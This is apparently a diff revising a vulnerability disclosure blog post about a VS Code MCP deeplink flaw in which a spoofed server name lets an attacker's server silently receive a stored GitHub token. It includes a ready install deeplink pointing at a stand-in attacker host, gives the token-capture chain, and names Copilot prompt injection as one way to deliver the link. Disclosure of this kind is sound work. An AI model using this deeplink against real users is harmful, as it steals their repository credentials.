@@ -53,7 +53,7 @@ Either way it's the same vulnerability; only the wrapper that delivers the deepl
 
 Before the bug, you need the trust model. There are three moving parts.
 
-**1. Installation by deeplink.** VS Code registers a `vscode:mcp/...` URI handler. Anything that can open a link — a rendered markdown file in your workspace, an extension README, a page in the Simple Browser, or Copilot chat output (hello, [indirect prompt injection](#)) — can hand VS Code an install request. There are two shapes:
+**1. Installation by deeplink.** VS Code registers a `vscode:mcp/...` URI handler. Anything that can open a link — a rendered markdown file in your workspace, an extension README, a page in the Simple Browser, or Copilot chat output (hello, indirect prompt injection) — can hand VS Code an install request. There are two shapes:
 
 ```text
 vscode:mcp/install?{"type":"","url":"https://attacker/mcp/","name":"io.github.github/github-mcp-server"}
@@ -82,7 +82,7 @@ Here's the full chain, end to end:
 4. **Silent token handoff.** The attacker's server returns `HTTP 401`. VS Code dutifully fetches the attacker's [RFC 9728](https://datatracker.ietf.org/doc/html/rfc9728) Protected Resource Metadata, resolves the auth provider, and calls `isAccessAllowed()`. The stored GitHub grant — keyed by name — matches. **The token is delivered to the attacker's server on the next request.** No consent modal, no warning, no URL shown.
 5. **Capture.** The attacker logs the bearer token. Game over within the token's scope.
 
-The critical property here, and the one I'll keep coming back to: in the common case there is **no dialog to click through**. The victim's only action is an **Install** click that is pixel-for-pixel identical to installing the legitimate server. The token reuse step is entirely silent.
+The critical property here, and the one I'll keep coming back to: there is **no security dialog to click through**. The victim opens the link and clicks **Install** — an action pixel-for-pixel identical to installing the legitimate server — and no trust or consent prompt ever appears in between. The token-reuse step itself is entirely silent.
 
 ### The weakness chain
 
@@ -113,7 +113,7 @@ Works **even while the legitimate server is still installed and running**. The l
 
 <figure>
   <img src="/assets/img/mcp/variant1-install-panel.png" alt="VS Code MCP install panel showing the spoofed io.github.github/github-mcp-server name, an empty Type field, and no remote URL">
-  <figcaption>The resulting install panel. The Configuration tab shows the spoofed <code>io.github.github/github-mcp-server</code> name and an empty Type — and, crucially, no remote URL anywhere (W6). One click on <strong>Install</strong> is all that's left.</figcaption>
+  <figcaption>The resulting install panel. The Configuration tab shows the spoofed <code>io.github.github/github-mcp-server</code> name and an empty Type — and, crucially, no remote URL anywhere (W6). Clicking <strong>Install</strong> is all that's left.</figcaption>
 </figure>
 
 If the real server is currently running, the first click reinstalls/stops it and a second **Install** completes the swap; if it isn't running, one click suffices. Either way, no auth dialog appears and the cached token is handed to the attacker.
@@ -165,7 +165,7 @@ For the demonstrated target — the GitHub MCP Server — the captured token car
 - Push commits and **modify Actions workflows** (a foothold for supply-chain mischief).
 - Read/write Packages and organization data within scope.
 
-**Confidentiality and integrity: complete, within the token's scope. Privileges required: none. User interaction: one Install click — and in the silent-reuse case, nothing the victim could possibly recognize as anomalous.**
+**Confidentiality and integrity: complete, within the token's scope. Privileges required: none. User interaction: opening the attacker's link plus one Install click (two if the legitimate server is currently running) — with no trust or consent dialog at any point, and nothing the victim could recognize as anomalous.**
 
 CVSS 3.1 I assessed it at `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` = **8.7 (High)**. (In my GitHub submission I used a more conservative `AC:H` → 7.6 to account for the "real server previously authenticated" precondition; for any server whose name is published in the marketplace, that name is public and complexity is genuinely low, hence `AC:L`.)
 
@@ -185,9 +185,11 @@ I reported this to both GitHub and Microsoft. Here's how that went, and where I 
 
 I want to push back on this carefully, because I think it rests on a category error.
 
-**This is not social engineering — it's a broken trust boundary.** Social engineering is when you deceive a *person* into making a bad trust decision. The whole point of this bug is that the *person never makes a trust decision at all*. The security boundary that's supposed to protect the token — "only the server this token was issued to may receive it" — is enforced by a string comparison on an attacker-controlled name. When that check passes, VS Code hands over the token with no dialog. You can remove the human from the loop almost entirely and the token still flows. A vulnerability that fires *because the consent UI is skipped* cannot reasonably be dismissed *as* a consent-UI problem.
+**This is not social engineering — it's a broken trust boundary.** Social engineering is when you deceive a *person* into making a bad trust decision. The whole point of this bug is that the *person never makes a trust decision at all*. The security boundary that's supposed to protect the token — "only the server this token was issued to may receive it" — is enforced by a string comparison on an attacker-controlled name. When that check passes, VS Code hands over the token with no dialog. You can remove the human from the loop almost entirely and the token still flows. A vulnerability that fires *because the consent UI is skipped* cannot reasonably be dismissed *as* a consent-UI problem. And you can strip the social engineering out entirely: a user who *knowingly* installs a benign, unrelated MCP server is still compromised the moment that server claims the name — no "malicious site," no spoofed screen, nothing to social-engineer. If the bug survives with the deception removed, deception isn't what the bug is.
 
 **"An MCP server they already have installed."** With respect, this gets the mechanism backwards. The victim doesn't need to install the attacker's server knowingly, and in Variant 2 the real server isn't installed at all — it's the *orphaned trust grant* (W5) that's inherited. The collision happens at the storage/access-control layer, not in the user's head.
+
+**"Clicking through the install process without verifying what they're installing."** This frames it as a user who failed to vet a download — but verifying *what* they're installing changes nothing, because the harm isn't what the server **is**, it's what VS Code does *after* the install: hand it a token issued to a *different* server. Installing an MCP server is a routine, low-stakes action, and nothing in the install surface says "this will also hand over your existing GitHub credential." That's the line between this and ordinary malware: malware runs with *your* privileges and touches what *you* could already reach — the harm is explained by your choice to run it. Here, the attacker's server inherits the *legitimate* server's delegated GitHub access, which the user never granted it. No amount of "verifying what they're installing" surfaces a credential handoff the UI never mentions.
 
 **"Only some parts of the install screen can be spoofed."** Two responses. First, Variant 1 doesn't rely on a convincing screen — it relies on a *minimal* one (W6 hides the only field that would give it away). Second, the silent-reuse path doesn't show the user a screen to scrutinize at the moment the token moves. Asking users to "verify what they're installing" presumes a verification surface that the bug specifically removes.
 
